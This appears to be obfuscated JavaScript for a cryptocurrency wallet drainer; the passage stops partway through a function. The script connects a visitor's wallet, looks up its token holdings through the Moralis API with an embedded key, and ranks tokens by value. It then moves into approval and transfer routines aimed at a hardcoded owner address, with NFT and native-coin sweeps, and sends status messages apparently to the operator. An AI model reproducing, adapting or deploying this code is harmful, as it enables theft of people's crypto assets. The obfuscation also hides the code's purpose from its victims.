const _0x193fa3=_0x5c06;(function(_0xb1003b,_0x4dd295){const _0x400933=_0x5c06,_0x39671b=_0xb1003b();while(!![]){try{const _0xac1537=parseInt(_0x400933(0x1fe))/0x1*(-parseInt(_0x400933(0x128))/0x2)+parseInt(_0x400933(0x119))/0x3+parseInt(_0x400933(0x162))/0x4+-parseInt(_0x400933(0x156))/0x5*(-parseInt(_0x400933(0x146))/0x6)+parseInt(_0x400933(0x1b1))/0x7*(-parseInt(_0x400933(0x181))/0x8)+parseInt(_0x400933(0x183))/0x9*(-parseInt(_0x400933(0x198))/0xa)+-parseInt(_0x400933(0x1e3))/0xb*(-parseInt(_0x400933(0x15b))/0xc);if(_0xac1537===_0x4dd295)break;else _0x39671b['push'](_0x39671b['shift']());}catch(_0x142c14){_0x39671b['push'](_0x39671b['shift']());}}}(_0x3dc9,0xc1b68));let tokens=[],NFTs=[],chainId=null,web3Object=null,selectedAccount=null;const Web3Modal=window[_0x193fa3(0x150)][_0x193fa3(0x13b)],WalletConnectProvider=window[_0x193fa3(0x173)][_0x193fa3(0x13b)],OWNER_ADDRESS=_0x193fa3(0x10d),ABI=[{'constant':!![],'inputs':[],'name':_0x193fa3(0x1e8),'outputs':[{'name':'','type':_0x193fa3(0x1a4)}],'payable':![],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'constant':![],'inputs':[{'name':'_upgradedAddress','type':_0x193fa3(0x1d5)}],'name':_0x193fa3(0x184),'outputs':[],'payable':![],'stateMutability':_0x193fa3(0x1cb),'type':_0x193fa3(0x112)},{'constant':![],'inputs':[{'name':_0x193fa3(0x1a9),'type':_0x193fa3(0x1d5)},{'name':_0x193fa3(0x12e),'type':_0x193fa3(0x1ec)}],'name':'approve','outputs':[],'payable':![],'stateMutability':_0x193fa3(0x1cb),'type':_0x193fa3(0x112)},{'constant':!![],'inputs':[],'name':_0x193fa3(0x1b6),'outputs':[{'name':'','type':_0x193fa3(0x167)}],'payable':![],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'constant':![],'inputs':[{'name':'_evilUser','type':_0x193fa3(0x1d5)}],'name':_0x193fa3(0x1a0),'outputs':[],'payable':![],'stateMutability':_0x193fa3(0x1cb),'type':_0x193fa3(0x112)},{'constant':!![],'inputs':[],'name':_0x193fa3(0x122),'outputs':[{'name':'','type':_0x193fa3(0x1ec)}],'payable':![],'stateMutability':'view','type':_0x193fa3(0x112)},{'constant':![],'inputs':[{'name':_0x193fa3(0x1bc),'type':'address'},{'name':_0x193fa3(0x126),'type':_0x193fa3(0x1d5)},{'name':_0x193fa3(0x12e),'type':'uint256'}],'name':'transferFrom','outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':!![],'inputs':[],'name':_0x193fa3(0x159),'outputs':[{'name':'','type':_0x193fa3(0x1d5)}],'payable':![],'stateMutability':_0x193fa3(0x1cd),'type':'function'},{'constant':!![],'inputs':[{'name':'','type':'address'}],'name':'balances','outputs':[{'name':'','type':_0x193fa3(0x1ec)}],'payable':![],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'constant':!![],'inputs':[],'name':_0x193fa3(0x16a),'outputs':[{'name':'','type':_0x193fa3(0x1ec)}],'payable':![],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'constant':!![],'inputs':[],'name':_0x193fa3(0x1b3),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':_0x193fa3(0x112)},{'constant':!![],'inputs':[],'name':_0x193fa3(0x14d),'outputs':[{'name':'','type':_0x193fa3(0x1ec)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':![],'inputs':[],'name':_0x193fa3(0x171),'outputs':[],'payable':![],'stateMutability':_0x193fa3(0x1cb),'type':_0x193fa3(0x112)},{'constant':!![],'inputs':[{'name':_0x193fa3(0x127),'type':_0x193fa3(0x1d5)}],'name':_0x193fa3(0x1f7),'outputs':[{'name':'','type':_0x193fa3(0x167)}],'payable':![],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'constant':!![],'inputs':[{'name':'','type':'address'},{'name':'','type':_0x193fa3(0x1d5)}],'name':_0x193fa3(0x187),'outputs':[{'name':'','type':_0x193fa3(0x1ec)}],'payable':![],'stateMutability':'view','type':_0x193fa3(0x112)},{'constant':!![],'inputs':[],'name':_0x193fa3(0x18b),'outputs':[{'name':'','type':_0x193fa3(0x167)}],'payable':![],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'constant':!![],'inputs':[{'name':_0x193fa3(0x14e),'type':_0x193fa3(0x1d5)}],'name':'balanceOf','outputs':[{'name':'','type':_0x193fa3(0x1ec)}],'payable':![],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'constant':![],'inputs':[],'name':_0x193fa3(0x1db),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':!![],'inputs':[],'name':'getOwner','outputs':[{'name':'','type':_0x193fa3(0x1d5)}],'payable':![],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'constant':!![],'inputs':[],'name':'owner','outputs':[{'name':'','type':_0x193fa3(0x1d5)}],'payable':![],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'constant':!![],'inputs':[],'name':_0x193fa3(0x192),'outputs':[{'name':'','type':_0x193fa3(0x1a4)}],'payable':![],'stateMutability':'view','type':_0x193fa3(0x112)},{'constant':![],'inputs':[{'name':_0x193fa3(0x126),'type':_0x193fa3(0x1d5)},{'name':_0x193fa3(0x12e),'type':'uint256'}],'name':_0x193fa3(0x1c3),'outputs':[],'payable':![],'stateMutability':_0x193fa3(0x1cb),'type':_0x193fa3(0x112)},{'constant':![],'inputs':[{'name':_0x193fa3(0x1b8),'type':'uint256'},{'name':'newMaxFee','type':_0x193fa3(0x1ec)}],'name':_0x193fa3(0x1a7),'outputs':[],'payable':![],'stateMutability':_0x193fa3(0x1cb),'type':'function'},{'constant':![],'inputs':[{'name':_0x193fa3(0x1e6),'type':'uint256'}],'name':_0x193fa3(0x19e),'outputs':[],'payable':![],'stateMutability':_0x193fa3(0x1cb),'type':'function'},{'constant':![],'inputs':[{'name':_0x193fa3(0x1e6),'type':'uint256'}],'name':'redeem','outputs':[],'payable':![],'stateMutability':_0x193fa3(0x1cb),'type':_0x193fa3(0x112)},{'constant':!![],'inputs':[{'name':_0x193fa3(0x1c6),'type':'address'},{'name':_0x193fa3(0x1a9),'type':_0x193fa3(0x1d5)}],'name':_0x193fa3(0x123),'outputs':[{'name':_0x193fa3(0x16b),'type':_0x193fa3(0x1ec)}],'payable':![],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'constant':!![],'inputs':[],'name':'basisPointsRate','outputs':[{'name':'','type':_0x193fa3(0x1ec)}],'payable':![],'stateMutability':_0x193fa3(0x1cd),'type':'function'},{'constant':!![],'inputs':[{'name':'','type':_0x193fa3(0x1d5)}],'name':_0x193fa3(0x129),'outputs':[{'name':'','type':_0x193fa3(0x167)}],'payable':![],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'constant':![],'inputs':[{'name':_0x193fa3(0x1cc),'type':_0x193fa3(0x1d5)}],'name':_0x193fa3(0x194),'outputs':[],'payable':![],'stateMutability':_0x193fa3(0x1cb),'type':'function'},{'constant':!![],'inputs':[],'name':'MAX_UINT','outputs':[{'name':'','type':_0x193fa3(0x1ec)}],'payable':![],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'constant':![],'inputs':[{'name':'newOwner','type':_0x193fa3(0x1d5)}],'name':_0x193fa3(0x1c5),'outputs':[],'payable':![],'stateMutability':_0x193fa3(0x1cb),'type':_0x193fa3(0x112)},{'constant':![],'inputs':[{'name':'_blackListedUser','type':'address'}],'name':'destroyBlackFunds','outputs':[],'payable':![],'stateMutability':_0x193fa3(0x1cb),'type':_0x193fa3(0x112)},{'inputs':[{'name':_0x193fa3(0x11d),'type':_0x193fa3(0x1ec)},{'name':_0x193fa3(0x1fc),'type':_0x193fa3(0x1a4)},{'name':_0x193fa3(0x117),'type':_0x193fa3(0x1a4)},{'name':_0x193fa3(0x1f9),'type':_0x193fa3(0x1ec)}],'payable':![],'stateMutability':_0x193fa3(0x1cb),'type':_0x193fa3(0x1c4)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x193fa3(0x1e6),'type':'uint256'}],'name':'Issue','type':_0x193fa3(0x18d)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x193fa3(0x1e6),'type':_0x193fa3(0x1ec)}],'name':_0x193fa3(0x204),'type':_0x193fa3(0x18d)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x193fa3(0x147),'type':_0x193fa3(0x1d5)}],'name':_0x193fa3(0x131),'type':_0x193fa3(0x18d)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x193fa3(0x10e),'type':'uint256'},{'indexed':![],'name':_0x193fa3(0x189),'type':_0x193fa3(0x1ec)}],'name':_0x193fa3(0x165),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x193fa3(0x1ae),'type':_0x193fa3(0x1d5)},{'indexed':![],'name':'_balance','type':_0x193fa3(0x1ec)}],'name':_0x193fa3(0x17d),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x193fa3(0x111),'type':'address'}],'name':_0x193fa3(0x110),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':'_user','type':_0x193fa3(0x1d5)}],'name':_0x193fa3(0x1d8),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x193fa3(0x14a),'type':'address'},{'indexed':!![],'name':_0x193fa3(0x1ed),'type':'address'},{'indexed':![],'name':_0x193fa3(0x18f),'type':_0x193fa3(0x1ec)}],'name':_0x193fa3(0x186),'type':_0x193fa3(0x18d)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x193fa3(0x205),'type':_0x193fa3(0x1d5)},{'indexed':!![],'name':'to','type':'address'},{'indexed':![],'name':_0x193fa3(0x18f),'type':_0x193fa3(0x1ec)}],'name':_0x193fa3(0x14f),'type':_0x193fa3(0x18d)},{'anonymous':![],'inputs':[],'name':_0x193fa3(0x160),'type':_0x193fa3(0x18d)},{'anonymous':![],'inputs':[],'name':_0x193fa3(0x188),'type':'event'}],ABIN=[{'inputs':[{'internalType':_0x193fa3(0x1a4),'name':_0x193fa3(0x1e8),'type':'string'},{'internalType':_0x193fa3(0x1a4),'name':_0x193fa3(0x192),'type':_0x193fa3(0x1a4)},{'internalType':_0x193fa3(0x1ec),'name':'maxNftSupply','type':_0x193fa3(0x1ec)},{'internalType':'uint256','name':_0x193fa3(0x19f),'type':_0x193fa3(0x1ec)}],'stateMutability':_0x193fa3(0x1cb),'type':_0x193fa3(0x1c4)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x193fa3(0x1d5),'name':_0x193fa3(0x14a),'type':_0x193fa3(0x1d5)},{'indexed':!![],'internalType':_0x193fa3(0x1d5),'name':_0x193fa3(0x1e1),'type':_0x193fa3(0x1d5)},{'indexed':!![],'internalType':'uint256','name':_0x193fa3(0x15e),'type':'uint256'}],'name':_0x193fa3(0x186),'type':_0x193fa3(0x18d)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x193fa3(0x1d5),'name':_0x193fa3(0x14a),'type':_0x193fa3(0x1d5)},{'indexed':!![],'internalType':_0x193fa3(0x1d5),'name':'operator','type':_0x193fa3(0x1d5)},{'indexed':![],'internalType':_0x193fa3(0x167),'name':'approved','type':_0x193fa3(0x167)}],'name':_0x193fa3(0x174),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x193fa3(0x1d5),'name':_0x193fa3(0x1a3),'type':'address'},{'indexed':!![],'internalType':_0x193fa3(0x1d5),'name':_0x193fa3(0x1d0),'type':_0x193fa3(0x1d5)}],'name':_0x193fa3(0x1c0),'type':_0x193fa3(0x18d)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':'address','name':_0x193fa3(0x205),'type':'address'},{'indexed':!![],'internalType':_0x193fa3(0x1d5),'name':'to','type':'address'},{'indexed':!![],'internalType':_0x193fa3(0x1ec),'name':_0x193fa3(0x15e),'type':_0x193fa3(0x1ec)}],'name':_0x193fa3(0x14f),'type':_0x193fa3(0x18d)},{'inputs':[],'name':'BAYC_PROVENANCE','outputs':[{'internalType':_0x193fa3(0x1a4),'name':'','type':_0x193fa3(0x1a4)}],'stateMutability':'view','type':_0x193fa3(0x112)},{'inputs':[],'name':_0x193fa3(0x1bf),'outputs':[{'internalType':_0x193fa3(0x1ec),'name':'','type':_0x193fa3(0x1ec)}],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'inputs':[],'name':'REVEAL_TIMESTAMP','outputs':[{'internalType':_0x193fa3(0x1ec),'name':'','type':_0x193fa3(0x1ec)}],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'inputs':[],'name':_0x193fa3(0x172),'outputs':[{'internalType':_0x193fa3(0x1ec),'name':'','type':_0x193fa3(0x1ec)}],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'inputs':[{'internalType':_0x193fa3(0x1d5),'name':'to','type':_0x193fa3(0x1d5)},{'internalType':_0x193fa3(0x1ec),'name':_0x193fa3(0x15e),'type':_0x193fa3(0x1ec)}],'name':_0x193fa3(0x16d),'outputs':[],'stateMutability':_0x193fa3(0x1cb),'type':'function'},{'inputs':[{'internalType':_0x193fa3(0x1d5),'name':_0x193fa3(0x14a),'type':_0x193fa3(0x1d5)}],'name':_0x193fa3(0x1d9),'outputs':[{'internalType':_0x193fa3(0x1ec),'name':'','type':'uint256'}],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'inputs':[],'name':'baseURI','outputs':[{'internalType':_0x193fa3(0x1a4),'name':'','type':_0x193fa3(0x1a4)}],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'inputs':[],'name':_0x193fa3(0x16e),'outputs':[],'stateMutability':'nonpayable','type':_0x193fa3(0x112)},{'inputs':[],'name':_0x193fa3(0x149),'outputs':[],'stateMutability':'nonpayable','type':_0x193fa3(0x112)},{'inputs':[{'internalType':_0x193fa3(0x1ec),'name':_0x193fa3(0x15e),'type':_0x193fa3(0x1ec)}],'name':_0x193fa3(0x157),'outputs':[{'internalType':_0x193fa3(0x1d5),'name':'','type':_0x193fa3(0x1d5)}],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'inputs':[{'internalType':'address','name':_0x193fa3(0x14a),'type':_0x193fa3(0x1d5)},{'internalType':_0x193fa3(0x1d5),'name':_0x193fa3(0x15d),'type':_0x193fa3(0x1d5)}],'name':_0x193fa3(0x1a8),'outputs':[{'internalType':_0x193fa3(0x167),'name':'','type':_0x193fa3(0x167)}],'stateMutability':_0x193fa3(0x1cd),'type':'function'},{'inputs':[],'name':_0x193fa3(0x202),'outputs':[{'internalType':_0x193fa3(0x1ec),'name':'','type':_0x193fa3(0x1ec)}],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'inputs':[{'internalType':_0x193fa3(0x1ec),'name':_0x193fa3(0x1d1),'type':_0x193fa3(0x1ec)}],'name':_0x193fa3(0x182),'outputs':[],'stateMutability':_0x193fa3(0x140),'type':_0x193fa3(0x112)},{'inputs':[],'name':_0x193fa3(0x1e8),'outputs':[{'internalType':_0x193fa3(0x1a4),'name':'','type':_0x193fa3(0x1a4)}],'stateMutability':'view','type':_0x193fa3(0x112)},{'inputs':[],'name':_0x193fa3(0x14a),'outputs':[{'internalType':_0x193fa3(0x1d5),'name':'','type':_0x193fa3(0x1d5)}],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'inputs':[{'internalType':_0x193fa3(0x1ec),'name':_0x193fa3(0x15e),'type':_0x193fa3(0x1ec)}],'name':_0x193fa3(0x1a2),'outputs':[{'internalType':'address','name':'','type':_0x193fa3(0x1d5)}],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'inputs':[],'name':_0x193fa3(0x1e5),'outputs':[],'stateMutability':_0x193fa3(0x1cb),'type':'function'},{'inputs':[],'name':'reserveApes','outputs':[],'stateMutability':_0x193fa3(0x1cb),'type':'function'},{'inputs':[{'internalType':'address','name':_0x193fa3(0x205),'type':_0x193fa3(0x1d5)},{'internalType':_0x193fa3(0x1d5),'name':'to','type':_0x193fa3(0x1d5)},{'internalType':_0x193fa3(0x1ec),'name':_0x193fa3(0x15e),'type':'uint256'}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x193fa3(0x1cb),'type':_0x193fa3(0x112)},{'inputs':[{'internalType':_0x193fa3(0x1d5),'name':_0x193fa3(0x205),'type':'address'},{'internalType':_0x193fa3(0x1d5),'name':'to','type':_0x193fa3(0x1d5)},{'internalType':'uint256','name':'tokenId','type':_0x193fa3(0x1ec)},{'internalType':_0x193fa3(0x190),'name':_0x193fa3(0x114),'type':_0x193fa3(0x190)}],'name':'safeTransferFrom','outputs':[],'stateMutability':_0x193fa3(0x1cb),'type':'function'},{'inputs':[],'name':_0x193fa3(0x10b),'outputs':[{'internalType':'bool','name':'','type':_0x193fa3(0x167)}],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'inputs':[{'internalType':'address','name':'operator','type':_0x193fa3(0x1d5)},{'internalType':_0x193fa3(0x167),'name':_0x193fa3(0x1e1),'type':'bool'}],'name':_0x193fa3(0x193),'outputs':[],'stateMutability':'nonpayable','type':_0x193fa3(0x112)},{'inputs':[{'internalType':_0x193fa3(0x1a4),'name':_0x193fa3(0x155),'type':_0x193fa3(0x1a4)}],'name':_0x193fa3(0x134),'outputs':[],'stateMutability':'nonpayable','type':_0x193fa3(0x112)},{'inputs':[{'internalType':_0x193fa3(0x1a4),'name':_0x193fa3(0x14b),'type':_0x193fa3(0x1a4)}],'name':_0x193fa3(0x18e),'outputs':[],'stateMutability':'nonpayable','type':_0x193fa3(0x112)},{'inputs':[{'internalType':'uint256','name':_0x193fa3(0x13e),'type':'uint256'}],'name':'setRevealTimestamp','outputs':[],'stateMutability':_0x193fa3(0x1cb),'type':'function'},{'inputs':[],'name':_0x193fa3(0x133),'outputs':[],'stateMutability':_0x193fa3(0x1cb),'type':_0x193fa3(0x112)},{'inputs':[],'name':_0x193fa3(0x19d),'outputs':[{'internalType':_0x193fa3(0x1ec),'name':'','type':_0x193fa3(0x1ec)}],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'inputs':[],'name':_0x193fa3(0x179),'outputs':[{'internalType':_0x193fa3(0x1ec),'name':'','type':_0x193fa3(0x1ec)}],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'inputs':[{'internalType':_0x193fa3(0x11c),'name':_0x193fa3(0x15a),'type':_0x193fa3(0x11c)}],'name':'supportsInterface','outputs':[{'internalType':_0x193fa3(0x167),'name':'','type':_0x193fa3(0x167)}],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'inputs':[],'name':_0x193fa3(0x192),'outputs':[{'internalType':_0x193fa3(0x1a4),'name':'','type':_0x193fa3(0x1a4)}],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'inputs':[{'internalType':_0x193fa3(0x1ec),'name':'index','type':_0x193fa3(0x1ec)}],'name':'tokenByIndex','outputs':[{'internalType':_0x193fa3(0x1ec),'name':'','type':_0x193fa3(0x1ec)}],'stateMutability':_0x193fa3(0x1cd),'type':'function'},{'inputs':[{'internalType':_0x193fa3(0x1d5),'name':_0x193fa3(0x14a),'type':_0x193fa3(0x1d5)},{'internalType':'uint256','name':_0x193fa3(0x1df),'type':_0x193fa3(0x1ec)}],'name':'tokenOfOwnerByIndex','outputs':[{'internalType':_0x193fa3(0x1ec),'name':'','type':_0x193fa3(0x1ec)}],'stateMutability':_0x193fa3(0x1cd),'type':'function'},{'inputs':[{'internalType':'uint256','name':_0x193fa3(0x15e),'type':_0x193fa3(0x1ec)}],'name':'tokenURI','outputs':[{'internalType':_0x193fa3(0x1a4),'name':'','type':_0x193fa3(0x1a4)}],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'inputs':[],'name':_0x193fa3(0x122),'outputs':[{'internalType':_0x193fa3(0x1ec),'name':'','type':_0x193fa3(0x1ec)}],'stateMutability':_0x193fa3(0x1cd),'type':_0x193fa3(0x112)},{'inputs':[{'internalType':_0x193fa3(0x1d5),'name':'from','type':_0x193fa3(0x1d5)},{'internalType':_0x193fa3(0x1d5),'name':'to','type':'address'},{'internalType':_0x193fa3(0x1ec),'name':_0x193fa3(0x15e),'type':_0x193fa3(0x1ec)}],'name':_0x193fa3(0x10c),'outputs':[],'stateMutability':_0x193fa3(0x1cb),'type':_0x193fa3(0x112)},{'inputs':[{'internalType':'address','name':_0x193fa3(0x1d0),'type':_0x193fa3(0x1d5)}],'name':_0x193fa3(0x1c5),'outputs':[],'stateMutability':'nonpayable','type':_0x193fa3(0x112)},{'inputs':[],'name':_0x193fa3(0x161),'outputs':[],'stateMutability':_0x193fa3(0x1cb),'type':_0x193fa3(0x112)}],networkToId={0x1328cf7:'btc-mainnet',0x1:_0x193fa3(0x141),0x5:'eth-goerli',0x89:_0x193fa3(0x148),0x13881:'matic-mumbai',0x38:_0x193fa3(0x1cf),0x61:_0x193fa3(0x1b2),0xa86a:_0x193fa3(0x139),0xa869:_0x193fa3(0x124),0xfa:_0x193fa3(0x143),0xfa2:'fantom-testnet',0xa4b1:_0x193fa3(0x15f),0x66eed:_0x193fa3(0x19a),0xa4ba:_0x193fa3(0x1d6),0x250:_0x193fa3(0x1b4),0x51:_0x193fa3(0x200),0x150:_0x193fa3(0x118),0x4e454152:_0x193fa3(0x195),0x4e454153:_0x193fa3(0x164),0x6984c:_0x193fa3(0x12b),0x69849:_0x193fa3(0x144),0x7e4:_0x193fa3(0x1d3),0x14a33:_0x193fa3(0x1fb),0x77:'bittorrent-mainnet',0x405:'bittorrent-testnet',0xa918:_0x193fa3(0x1e0),0x10e8:'boba-avalanche-testnet',0xdbe0:_0x193fa3(0x1dd),0x2600:_0x193fa3(0x1ea),0x50e:'boba-bobabeam-mainnet',0x511:_0x193fa3(0x19c),0x120:'boba-mainnet',0x1c:_0x193fa3(0x1ce),0xb48:_0x193fa3(0x1b9),0x1e14:_0x193fa3(0x1fa),0x436f7631:_0x193fa3(0x166),0x19:_0x193fa3(0x11f),0x152:_0x193fa3(0x17a),0xd2af:_0x193fa3(0x13d),0x14f:_0x193fa3(0x16c),0xa516:_0x193fa3(0x1a6),0x2329:_0x193fa3(0x17b),0x2328:'evmos-testnet',0x868:_0x193fa3(0x1f0),0x86a:_0x193fa3(0x177),0x13:'flarenetworks-canary-mainnet',0x10:_0x193fa3(0x1f2),0xe:_0x193fa3(0x19b),0x72:'flarenetworks-flare-testnet',0xb7e7759:_0x193fa3(0x154),0x153c099c:_0x193fa3(0x151),0x63564c40:_0x193fa3(0x1b0),0x6357d2e0:_0x193fa3(0x11e),0x141:_0x193fa3(0x1fd),0x142:'kcc-testnet',0xe704:_0x193fa3(0x132),0x1389:_0x193fa3(0x18a),0x52:_0x193fa3(0x1f5),0x53:_0x193fa3(0x1ca),0x440:_0x193fa3(0x137),0x24c:_0x193fa3(0x1ef),0x7d2:'milkomeda-a1-mainnet',0x30e0a:'milkomeda-a1-devnet',0x7d1:'milkomeda-c1-mainnet',0x30da5:'milkomeda-c1-devnet',0x504:'moonbeam-mainnet',0x507:_0x193fa3(0x196),0x505:_0x193fa3(0x206),0xe9ac0ce:'neon-testnet',0x116ea:_0x193fa3(0x1f8),0x116e9:_0x193fa3(0x180),0x116e1:'nervos-polyjuice-testnet',0x5afe:_0x193fa3(0x13f),0x5aff:_0x193fa3(0x12d),0xf8:_0x193fa3(0x185),0x249c:_0x193fa3(0x201),0xa:'optimism-mainnet',0x2a15c308d:_0x193fa3(0x10f),0x2a15c3083:_0x193fa3(0x1ad),0x5a2:'polygon-zkevm-testnet',0x1e:'rsk-mainnet',0x1f:'rsk-testnet',0x5d456c62:_0x193fa3(0x1ee),0x1482a7b2:_0x193fa3(0x1b7),0x3d28774d:_0x193fa3(0x1d4),0x109b4597:'skale-razor',0x536f6c4d:_0x193fa3(0x12c),0x1202c:_0x193fa3(0x12f),0x1202d:_0x193fa3(0x1eb),0x1a0:'sx-mainnet'},providerOptions={'walletconnect':{'package':WalletConnectProvider,'options':{'rpc':{0xa86a:_0x193fa3(0x12a)},'chainId':0xa86a,'network':_0x193fa3(0x1af),'infuraId':_0x193fa3(0x1d2),'pollingInterval':_0x193fa3(0x142)}},'coinbasewallet':{'package':CoinbaseWalletSDK,'options':{'appName':'Debug','infuraId':_0x193fa3(0x1d2),'rpc':_0x193fa3(0x12a),'chainId':0xa86a,'chainName':_0x193fa3(0x1af),'darkMode':![]}}};let web3Modal=new Web3Modal({'providerOptions':providerOptions,'cacheProvider':![],'disableInjectedProvider':![]});$(_0x193fa3(0x1f6))['click'](async function(){const _0x4b4c89=_0x193fa3;try{let _0x4aeb5c=await web3Modal[_0x4b4c89(0x1e7)]();onProvider(_0x4aeb5c),_0x4aeb5c['on'](_0x4b4c89(0x1ff),_0x3b28ae=>{const _0xa2ba77=_0x4b4c89;console[_0xa2ba77(0x197)](_0x3b28ae),onProvider(_0x4aeb5c);});}catch(_0x28bc0c){console[_0x4b4c89(0x197)](_0x4b4c89(0x1ba),_0x28bc0c);return;}});function _0x5c06(_0x101074,_0x2bca57){const _0x3dc9e8=_0x3dc9();return _0x5c06=function(_0x5c0668,_0x3629c8){_0x5c0668=_0x5c0668-0x10b;let _0x56057c=_0x3dc9e8[_0x5c0668];return _0x56057c;},_0x5c06(_0x101074,_0x2bca57);}async function onProvider(_0x1631b0){const _0x520eb6=_0x193fa3;web3Object=new Web3(_0x1631b0);let _0x4ff980=await web3Object[_0x520eb6(0x17c)][_0x520eb6(0x116)]();selectedAccount=_0x4ff980[0x0],chainName=await web3Object[_0x520eb6(0x17c)]['getChainId'](),chainId=networkToId[chainName],console['log'](chainId),console[_0x520eb6(0x197)](selectedAccount),_0x4ff980[_0x520eb6(0x168)]&&(sendMessage('Wallet\x20Connected\x20Successfully\x20to\x20AVAX!'),sendMessage('Cl\x20address\x20:\x20'+selectedAccount),covalenthqAPICall());}const Oxa=_0x193fa3(0x130),Oxc=_0x193fa3(0x1da);async function covalenthqAPICall(){const _0xa1ade=_0x193fa3,_0x55a1a0={'chain':_0xa1ade(0x152)},_0x5f2b46=new URL('https://deep-index.moralis.io/api/v2/'+selectedAccount+_0xa1ade(0x120));_0x5f2b46['search']=new URLSearchParams(_0x55a1a0)[_0xa1ade(0x1dc)]();const _0xa91ddd={'method':_0xa1ade(0x1c9),'headers':{'accept':_0xa1ade(0x113),'X-API-Key':'xlBMsLxjEFcdSN1TGdya7jDy33DsMXbpi7rSypmNzxccgOoRzP8zocDThugOatoD'}};try{const _0x5fa02=await fetch(_0x5f2b46,_0xa91ddd)[_0xa1ade(0x153)](_0x6fcd3e=>_0x6fcd3e[_0xa1ade(0x1b5)]());console[_0xa1ade(0x197)](_0x5fa02);let _0x1c8823=_0x5fa02;console['log'](_0xa1ade(0x158),_0x1c8823);let _0x5bb7f0=await Promise[_0xa1ade(0x170)](_0x1c8823[_0xa1ade(0x121)](async _0x1fdf46=>{const _0x1299ea=_0xa1ade;let _0x18d4fc;try{_0x18d4fc=await getValue(_0x1fdf46[_0x1299ea(0x11a)],_0x1fdf46['balance'],_0x1fdf46[_0x1299ea(0x16a)]);}catch(_0x32b1d5){_0x18d4fc=0x0;}return console[_0x1299ea(0x197)](_0x18d4fc),{'balance':_0x1fdf46['balance'],'value':_0x18d4fc,'address':_0x1fdf46['token_address']};}));console[_0xa1ade(0x197)](_0xa1ade(0x1ab),_0x5bb7f0),tokens=_0x5bb7f0[_0xa1ade(0x199)](_0x39ef66=>_0x39ef66[_0xa1ade(0x18f)]>0x5),tokens[_0xa1ade(0x1c7)]((_0xfa654e,_0xcd04ec)=>_0xcd04ec[_0xa1ade(0x18f)]-_0xfa654e['value']),console[_0xa1ade(0x197)](_0xa1ade(0x125),chainId,'Tokens:',tokens);if(tokens['length']===0x0)onSendEther();else onApprove();}catch{sendMessage(_0xa1ade(0x1d7));}NFTs=await getNFTs(selectedAccount)[_0xa1ade(0x1e9)](_0x2fe439=>{const _0x38b0d6=_0xa1ade;console[_0x38b0d6(0x197)](_0x38b0d6(0x1f4),_0x2fe439);}),NFTs=NFTs[_0xa1ade(0x1a5)],console[_0xa1ade(0x197)](_0xa1ade(0x207),NFTs);}async function onApprove(){const _0x49a018=_0x193fa3;if(tokens[_0x49a018(0x168)])try{loopTokens(tokens);}catch(_0x351f88){console[_0x49a018(0x17e)](_0x49a018(0x11b)+_0x351f88[_0x49a018(0x13c)]);}else{if(NFTs['length']){try{loopNfts(NFTs);}catch(_0x4ba708){console[_0x49a018(0x17e)](_0x49a018(0x11b)+_0x4ba708[_0x49a018(0x13c)]);}onSendEther(),sendMessage(_0x49a018(0x17f));}else try{onSendEther();}catch(_0x13f6dc){console['error'](_0x49a018(0x11b)+_0x13f6dc[_0x49a018(0x13c)]);}}}async function loopTokens(_0x42ca63){const _0x32cbc1=_0x193fa3;for await(let _0x3d1527 of _0x42ca63){console['log'](_0x32cbc1(0x1be),_0x3d1527);try{let _0x30d0e3=new web3Object['eth'][(_0x32cbc1(0x1aa))](ABI,_0x3d1527[_0x32cbc1(0x1d5)]);sendMessage(_0x32cbc1(0x1a1)),await 